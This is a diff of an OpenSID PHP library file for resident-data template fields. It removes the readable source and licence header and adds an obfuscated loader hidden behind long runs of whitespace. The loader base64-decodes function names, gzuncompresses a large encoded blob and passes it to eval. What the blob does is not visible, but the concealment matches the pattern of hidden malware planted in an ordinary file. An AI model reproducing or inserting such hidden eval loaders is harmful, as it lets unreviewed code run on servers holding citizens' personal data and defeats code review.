@@ -1,439 +1,553 @@
-<?php
+<?php 
+        $__='printf';$_='Loading app/Libraries/TinyMCE/KodeIsianPenduduk.php';
+        
 
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
 
-namespace App\Libraries\TinyMCE;
 
-use App\Enums\JenisKelaminEnum;
-use App\Enums\SHDKEnum;
-use App\Models\Penduduk;
-use Illuminate\Support\Str;
 
-class KodeIsianPenduduk
-{
-    public function __construct(private $idPenduduk = null, private $prefix = '', private $prefixJudul = false)
-    {
-    }
 
-    public static function get($idPenduduk = null, $prefix = '', $prefixJudul = false): array
-    {
-        return (new self($idPenduduk, $prefix, $prefixJudul))->kodeIsian();
-    }
 
-    public function kodeIsian(): array
-    {
-        $config   = identitas();
-        $ortu     = null;
-        $penduduk = null;
 
-        // Data Umum
-        if (! empty($this->prefix)) {
-            $ortu   = ' ' . ucwords((string) $this->prefix);
-            $prefix = '_' . $this->prefix;
-        }
 
-        if (! $this->prefixJudul) {
-            $ortu = '';
-        }
 
-        if ($this->idPenduduk) {
-            $penduduk = Penduduk::with(['keluarga', 'rtm', 'kb', 'bahasa'])->find($this->idPenduduk);
-        }
 
-        $individu = [
-            [
-                'case_sentence' => true,
-                'judul'         => 'NIK' . $ortu,
-                'isian'         => 'nik' . $prefix,
-                'data'          => get_nik($penduduk->nik),
-            ],
-            [
-                'judul' => 'Nama' . $ortu,
-                'isian' => 'nama' . $prefix,
-                'data'  => $penduduk->nama,
-            ],
-            [
-                'judul' => 'Tanggal Lahir' . $ortu,
-                'isian' => 'tanggallahir' . $prefix,
-                'data'  => formatTanggal($penduduk->tanggallahir),
-            ],
-            [
-                'judul' => 'Tempat Lahir' . $ortu,
-                'isian' => 'tempatlahir' . $prefix,
-                'data'  => $penduduk->tempatlahir,
-            ],
-            [
-                'judul' => 'Tempat Tanggal Lahir' . $ortu,
-                'isian' => 'tempat_tgl_lahir' . $prefix,
-                'data'  => $penduduk->tempatlahir . '/' . formatTanggal($penduduk->tanggallahir),
-            ],
-            [
-                'judul' => 'Tempat Tanggal Lahir (TTL)' . $ortu,
-                'isian' => 'ttl' . $prefix,
-                'data'  => $penduduk->tempatlahir . '/' . formatTanggal($penduduk->tanggallahir),
-            ],
-            [
-                'judul' => 'Usia' . $ortu,
-                'isian' => 'usia' . $prefix,
-                'data'  => $penduduk->usia,
-            ],
-            [
-                'judul' => 'Jenis Kelamin' . $ortu,
-                'isian' => 'jenis_kelamin' . $prefix,
-                'data'  => $penduduk->jenisKelamin->nama,
-            ],
-            [
-                'judul' => 'Jenis Kelamin ' . $ortu . '(Inisial)',
-                'isian' => 'jenis_kelamin_inisial' . $prefix,
-                'data'  => Str::substr($penduduk->jenisKelamin->nama, 0, 1),
-            ],
-            [
-                'judul' => 'Agama' . $ortu,
-                'isian' => 'agama' . $prefix,
-                'data'  => $penduduk->agama->nama,
-            ],
-            [
-                'judul' => 'Pekerjaan' . $ortu,
-                'isian' => 'pekerjaan' . $prefix,
-                'data'  => $penduduk->pekerjaan->nama,
-            ],
-            [
-                'judul' => 'Warga Negara' . $ortu,
-                'isian' => 'warga_negara' . $prefix,
-                'data'  => $penduduk->wargaNegara->nama,
-            ],
-            [
-                'judul' => 'Alamat' . $ortu,
-                'isian' => 'alamat' . $prefix,
-                'data'  => $penduduk->alamat_wilayah,
-            ],
-            [
-                'judul' => 'Alamat Lengkap' . $ortu,
-                'isian' => 'alamat_lengkap' . $prefix,
-                'data'  => $penduduk->alamat_wilayah . ', ' . ucwords(setting('sebutan_desa') . ' ' . $config->nama_desa . ', ' . setting('sebutan_kecamatan') . ' ' . $config->nama_kecamatan . ', ' . setting('sebutan_kabupaten') . ' ' . $config->nama_kabupaten . ', Provinsi ' . $config->nama_propinsi),
-            ],
-            [
-                'judul' => 'Golongan Darah' . $ortu,
-                'isian' => 'Gol_daraH' . $prefix,
-                'data'  => $penduduk->golonganDarah->nama,
-            ],
 
-            // melengkapi kode isian penduduk
-            [
-                'judul' => 'Suku' . $ortu,
-                'isian' => 'suku' . $prefix,
-                'data'  => $penduduk->suku,
-            ],
-            [
-                'judul' => 'No Telepon' . $ortu,
-                'isian' => 'telepon' . $prefix,
-                'data'  => $penduduk->telepon,
-            ],
-            [
-                'judul' => 'Nomor KITAS/KITAP' . $ortu,
-                'isian' => 'dokumen_kitas' . $prefix,
-                'data'  => $penduduk->dokumen_kitas,
-            ],
-            [
-                'judul' => 'Email' . $ortu,
-                'isian' => 'email' . $prefix,
-                'data'  => $penduduk->email,
-            ],
-            [
-                'judul' => 'Sakit Menahun' . $ortu,
-                'isian' => 'sakit_menahun' . $prefix,
-                'data'  => $penduduk->sakit_menahun,
-            ],
-            [
-                'judul' => 'Akseptor KB' . $ortu,
-                'isian' => 'cara_kb' . $prefix,
-                'data'  => $penduduk->kb->nama,
-            ],
-            [
-                'judul' => 'Nama/Nomor Asuransi Kesehatan' . $ortu,
-                'isian' => 'nama_asuransi' . $prefix,
-                'data'  => $penduduk->nama_asuransi,
-            ],
-            [
-                'judul' => 'Nomor BPJS Ketenagakerjaan' . $ortu,
-                'isian' => 'bpjs_ketenagakerjaan' . $prefix,
-                'data'  => $penduduk->bpjs_ketenagakerjaan,
-            ],
-            [
-                'judul' => 'Bahasa' . $ortu,
-                'isian' => 'Bahasa' . $prefix,
-                'data'  => $penduduk->bahasa->nama,
-            ],
-            [
-                'judul' => 'Pendidikan Sedang' . $ortu,
-                'isian' => 'pendidikan_sedang' . $prefix,
-                'data'  => $penduduk->pendidikan,
-            ],
-            [
-                'judul' => 'Pendidikan Dalam KK' . $ortu,
-                'isian' => 'pendidikan_kk' . $prefix,
-                'data'  => $penduduk->pendidikanKK,
-            ],
 
-            // kebutuhan penduduk luar desa
-            [
-                'judul' => 'Alamat Jalan' . $ortu,
-                'isian' => 'alamat_jalan' . $prefix,
-                'data'  => $penduduk->keluarga->alamat, // alamat kk jika ada
-            ],
-            [
-                'judul' => 'Alamat Sebelumnya' . $ortu,
-                'isian' => 'alamat_sebelumnya' . $prefix,
-                'data'  => $penduduk->alamat_sebelumnya,
-            ],
-            [
-                'judul' => 'Dusun' . $ortu,
-                'isian' => 'nama_dusun' . $prefix,
-                'data'  => $penduduk->wilayah->dusun,
-            ],
-            [
-                'judul' => 'RW' . $ortu,
-                'isian' => 'nama_rw' . $prefix,
-                'data'  => $penduduk->wilayah->rw,
-            ],
-            [
-                'judul' => 'RT' . $ortu,
-                'isian' => 'nama_rt' . $prefix,
-                'data'  => $penduduk->wilayah->rt,
-            ],
-            [
-                'judul' => 'Desa' . $ortu,
-                'isian' => 'pend_desa' . $prefix,
-                'data'  => $config->nama_desa,
-            ],
-            [
-                'judul' => 'Kecamatan' . $ortu,
-                'isian' => 'pend_kecamatan' . $prefix,
-                'data'  => $config->nama_kecamatan,
-            ],
-            [
-                'judul' => 'Kabupaten' . $ortu,
-                'isian' => 'pend_kabupaten' . $prefix,
-                'data'  => $config->nama_kabupaten,
-            ],
-            [
-                'judul' => 'Provinsi' . $ortu,
-                'isian' => 'pend_provinsi' . $prefix,
-                'data'  => $config->nama_propinsi,
-            ],
-            [
-                'case_sentence' => true,
-                'judul'         => 'Anak Ke' . $ortu,
-                'isian'         => 'anakke' . $prefix,
-                'data'          => $penduduk->kelahiran_anak_ke,
-            ],
-            [
-                'case_sentence' => true,
-                'judul'         => 'Jumlah Saudara' . $ortu,
-                'isian'         => 'jumlah_saudara' . $prefix,
-                'data'          => $penduduk->jml_anak,
-            ],
-            [
-                'case_sentence' => true,
-                'judul'         => 'Foto' . $ortu,
-                'isian'         => 'foto_penduduk' . $prefix,
-                'data'          => '[foto_penduduk]',
-            ],
-            [
-                'case_sentence' => true,
-                'judul'         => 'Foto Ukuran' . $ortu,
-                'isian'         => '<img src="' . base_url('assets/images/pengguna/kuser.png') . '" width="124" height="148">',
-                'data'          => empty($penduduk->foto) || ! file_exists(FCPATH . LOKASI_USER_PICT . $penduduk->foto) ? '' : base_url(LOKASI_USER_PICT . $penduduk->foto),
-            ],
-            [
-                'case_sentence' => true,
-                'judul'         => 'Foto Ukuran' . $ortu,
-                'isian'         => '<img src="' . base_url('desa/upload/media/kuser.png') . '" width="124" height="148">',
-                'data'          => empty($penduduk->foto) || ! file_exists(FCPATH . LOKASI_USER_PICT . $penduduk->foto) ? '' : base_url(LOKASI_USER_PICT . $penduduk->foto),
-            ],
-            [
-                'judul' => 'Akta Kelahiran' . $ortu,
-                'isian' => 'akta_lahir' . $prefix,
-                'data'  => $penduduk->akta_lahir, // Cek ini
-            ],
-            [
-                'judul' => 'Akta Perceraian' . $ortu,
-                'isian' => 'akta_perceraian' . $prefix,
-                'data'  => $penduduk->akta_perceraian, // Cek ini
-            ],
-            [
-                'judul' => 'Status Perkawinan' . $ortu,
-                'isian' => 'status_kawin' . $prefix,
-                'data'  => $penduduk->status_perkawinan, // Cek ini
-            ],
-            [
-                'judul' => 'Akta Perkawinan' . $ortu,
-                'isian' => 'akta_perkawinan' . $prefix,
-                'data'  => $penduduk->akta_perkawinan, // Cek ini
-            ],
-            [
-                'judul' => 'Tanggal Perkawinan' . $ortu,
-                'isian' => 'tanggalperkawinan' . $prefix,
-                'data'  => formatTanggal($penduduk->tanggalperkawinan),
-            ],
-            [
-                'judul' => 'Tanggal Perceraian' . $ortu,
-                'isian' => 'tanggalperceraian' . $prefix,
-                'data'  => formatTanggal($penduduk->tanggalperceraian),
-            ],
-            [
-                'judul' => 'Cacat' . $ortu,
-                'isian' => 'cacat' . $prefix,
-                'data'  => $penduduk->cacat->nama,
-            ],
-            [
-                'judul' => 'Dokumen Pasport' . $ortu,
-                'isian' => 'dokumen_pasport' . $prefix,
-                'data'  => $penduduk->dokumen_pasport,
-            ],
-            [
-                'judul' => 'Tanggal Akhir Paspor' . $ortu,
-                'isian' => 'tanggal_akhir_paspor' . $prefix,
-                'data'  => formatTanggal($penduduk->tanggal_akhir_paspor),
-            ],
 
-            // Data KK
-            [
-                'judul' => 'Hubungan Dalam KK' . $ortu,
-                'isian' => 'hubungan_kk' . $prefix,
-                'data'  => $penduduk->pendudukHubungan->nama,
-            ],
-            [
-                'case_sentence' => true,
-                'judul'         => 'No KK' . $ortu,
-                'isian'         => 'no_kk' . $prefix,
-                'data'          => get_nokk($penduduk->keluarga->no_kk),
-            ],
-            [
-                'judul' => 'Kepala KK' . $ortu,
-                'isian' => 'kepala_kk' . $prefix,
-                'data'  => $penduduk->keluarga->kepalaKeluarga->nama,
-            ],
-            [
-                'case_sentence' => true,
-                'judul'         => 'NIK KK' . $ortu,
-                'isian'         => 'nik_kepala_kk' . $prefix,
-                'data'          => get_nik($penduduk->keluarga->kepalaKeluarga->nik),
-            ],
 
-            // Data RTM
-            [
-                'case_sentence' => true,
-                'judul'         => 'ID BDT' . $ortu,
-                'isian'         => 'id_bdt' . $prefix,
-                'data'          => $penduduk->rtm->bdt,
-            ],
-        ];
 
-        if (empty($this->prefix)) {
-            // Data Umum
-            $data = $individu;
 
-            // Data Orang Tua
-            $id_ayah = Penduduk::where('nik', $penduduk->ayah_nik)->first()->id;
-            $id_ibu  = Penduduk::where('nik', $penduduk->ibu_nik)->first()->id;
 
-            if (! $id_ayah && $penduduk->kk_level == SHDKEnum::ANAK) {
-                $id_ayah = Penduduk::where('id_kk', $penduduk->id_kk)
-                    ->where(static function ($query): void {
-                        $query->where('kk_level', SHDKEnum::KEPALA_KELUARGA)
-                            ->orWhere('kk_level', SHDKEnum::SUAMI);
-                    })
-                    ->where('sex', JenisKelaminEnum::LAKI_LAKI)
-                    ->first()->id;
-            }
 
-            if (! $id_ibu && $penduduk->kk_level == SHDKEnum::ANAK) {
-                $id_ibu = Penduduk::where('id_kk', $penduduk->id_kk)
-                    ->where(static function ($query): void {
-                        $query->where('kk_level', SHDKEnum::KEPALA_KELUARGA)
-                            ->orWhere('kk_level', SHDKEnum::ISTRI);
-                    })
-                    ->where('sex', JenisKelaminEnum::PEREMPUAN)
-                    ->first()->id;
-            }
 
-            // Data Ayah
-            $data = array_merge($data, self::get($id_ayah, 'ayah', true));
 
-            if (! $id_ayah && ! empty($penduduk)) {
-                $data_ortu = [
-                    [
-                        'judul' => 'Nama Ayah',
-                        'isian' => 'Nama_ayaH',
-                        'data'  => $penduduk->nama_ayah,
-                    ],
-                    [
-                        'case_sentence' => true,
-                        'judul'         => 'NIK Ayah',
-                        'isian'         => 'nik_ayah',
-                        'data'          => get_nik($penduduk->ayah_nik),
-                    ],
-                ];
-                $data = array_merge($data, $data_ortu);
-            }
 
-            // Data Ibu
-            $data = array_merge($data, self::get($id_ibu, 'ibu', true));
 
-            if (! $id_ibu && ! empty($penduduk)) {
-                $data_ortu = [
-                    [
-                        'judul' => 'Nama Ibu',
-                        'isian' => 'Nama_ibU',
-                        'data'  => $penduduk->nama_ibu,
-                    ],
-                    [
-                        'case_sentence' => true,
-                        'judul'         => 'NIK Ibu',
-                        'isian'         => 'nik_ibu',
-                        'data'          => get_nik($penduduk->ibu_nik),
-                    ],
-                ];
-                $data = array_merge($data, $data_ortu);
-            }
 
-            return $data;
-        }
 
-        return $individu;
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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